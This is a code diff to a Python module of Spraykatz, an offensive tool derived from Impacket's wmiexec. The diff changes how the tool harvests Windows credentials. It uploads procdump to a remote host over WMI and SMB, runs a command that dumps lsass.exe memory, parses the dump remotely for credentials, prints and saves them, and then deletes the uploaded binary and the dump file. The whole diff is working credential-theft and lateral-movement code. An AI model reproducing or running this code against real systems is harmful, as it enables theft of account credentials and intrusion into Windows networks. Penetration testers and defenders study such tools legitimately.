@@ -20,7 +20,8 @@
 #
 #########################
 #########################
-# This file comes from Impacket project and has been slightly modified for Spraykatz.
+#
+# This file comes from Impacket project and has been slightly modified for Spraykatz by @lydericlefebvre.
 #
 #
 # Imports
@@ -41,6 +42,10 @@ from core.Utils import *
 from core.Colors import *
 from core.Paths import *
 from core.Logs import *
+from core.Dump import *
+from core.ParseDump import *
+from core.PrintCreds import *
+from core.WriteCreds import *
 from impacket.dcerpc.v5.dcomrt import DCOMConnection
 from impacket.dcerpc.v5.dcom import wmi
 from impacket.dcerpc.v5.dtypes import NULL
@@ -57,43 +62,21 @@ OUTPUT_FILENAME = '__' + str(time.time())
 CODEC = sys.stdout.encoding
 
 class WMIEXEC:
-    def __init__(self, command='', username='', password='', domain='', hashes=None, aesKey=None, share='ADMIN$', noOutput=False, doKerberos=False, kdcHost=None):
-        self.__command = command
+    def __init__(self, smbConnection, username='', password='', domain='', lmhash=None, nthash=None, aesKey=None, share='C$', noOutput=False, doKerberos=False, kdcHost=None):
+        self.__smbConnection = smbConnection
         self.__username = username
         self.__password = password
         self.__domain = domain
-        self.__lmhash = ''
-        self.__nthash = ''
+        self.__lmhash = lmhash
+        self.__nthash = nthash
         self.__aesKey = aesKey
         self.__share = share
         self.__noOutput = noOutput
         self.__doKerberos = doKerberos
         self.__kdcHost = kdcHost
         self.shell = None
-        if hashes is not None:
-            self.__lmhash, self.__nthash = hashes.split(':')
 
     def run(self, addr, osArch='64'):
-        if self.__noOutput is False:
-            smbConnection = SMBConnection(addr, addr)
-            if self.__doKerberos is False:
-                smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
-            else:
-                smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
-                                            self.__nthash, self.__aesKey, kdcHost=self.__kdcHost)
-
-            dialect = smbConnection.getDialect()
-            if dialect == SMB_DIALECT:
-                logging.debug("%sSMBv1 dialect used" % (debugBlue))
-            elif dialect == SMB2_DIALECT_002:
-                logging.debug("%sSMBv2.0 dialect used" % (debugBlue))
-            elif dialect == SMB2_DIALECT_21:
-                logging.debug("%sSMBv2.1 dialect used" % (debugBlue))
-            else:
-                logging.debug("%sSMBv3.0 dialect used" % (debugBlue))
-        else:
-            smbConnection = None
-
         dcom = DCOMConnection(addr, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey, oxidResolver=True, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
         try:
             iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,wmi.IID_IWbemLevel1Login)
@@ -103,28 +86,37 @@ class WMIEXEC:
 
             win32Process,_ = iWbemServices.GetObject('Win32_Process')
 
-            self.shell = RemoteShell(self.__share, win32Process, smbConnection)
+            self.shell = RemoteShell(self.__share, win32Process, self.__smbConnection)
 
             procpath = os.path.join(os.path.dirname(os.path.realpath(sys.argv[0])), 'misc', 'procdump', 'procdump%s.exe' % (osArch))
             logging.info("%s  Uploading procdump to %s..." % (debugBlue, addr))
-            with suppress_std():
-                self.shell.do_put(procpath)
+            #with suppress_std():
+            self.shell.do_put(procpath)
+                
             
             dt = datetime.now().strftime("%m-%d-%Y_%H-%M-%S")
+
             cmd = """for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do procdump{}.exe -accepteula -ma ^%B C:\\{}.dmp""".format(osArch, addr + "_" + dt)
             logging.info("%s  Executing procdump on %s..." % (debugBlue, addr))
-            #with suppress_std():
-            self.shell.onecmd(cmd)
+            if logging.getLogger().getEffectiveLevel() >= 30:
+                with suppress_std():
+                    self.shell.onecmd(cmd)
+            else:
+                self.shell.onecmd(cmd)
 
-            logging.info("%s  Retrieving %s's dump locally... (can take a while)." % (debugBlue, addr))
-            with suppress_std():
-                self.shell.do_get("%s.dmp" % (addr + "_" + dt))
+            logging.info("%s  Creating dump's file descriptor on %s..." % (debugBlue, addr))
+            logging.info("%s  Parsing %s's dump remotely..." % (debugBlue, addr))
+            dump = Dump(self.__smbConnection, """{}.dmp""".format(addr + "_" + dt))
+            credentials = parseDump(dump)
 
-        finally:
-            with suppress_std():
-                if pathlib.Path(addr + "_" + dt + '.dmp').exists():
-                    shutil.move(addr + "_" + dt + '.dmp', os.path.join(dumpDir, addr + "_" + dt + '.dmp'))
+            if credentials is not None:
+                print_credentials(addr, credentials)
+                write_credentials(addr, credentials)
             
+        finally:
+            logging.info("%s  Closing dump file on %s..." % (debugBlue, addr))
+            dump.close()
+
             logging.info("%s  Deleting procdump on %s..." % (debugBlue, addr))
             with suppress_std():
                 self.shell.onecmd("del procdump%s.exe" % (osArch))
@@ -132,9 +124,9 @@ class WMIEXEC:
             logging.info("%s  Deleting dump on %s..." % (debugBlue, addr))
             with suppress_std():
                 self.shell.onecmd("del %s.dmp" % (addr + "_" + dt))
-        
-            if smbConnection is not None:
-                smbConnection.logoff()
+
+            if self.__smbConnection is not None:
+                self.__smbConnection.logoff()
             dcom.disconnect()
             sys.stdout.flush()
 
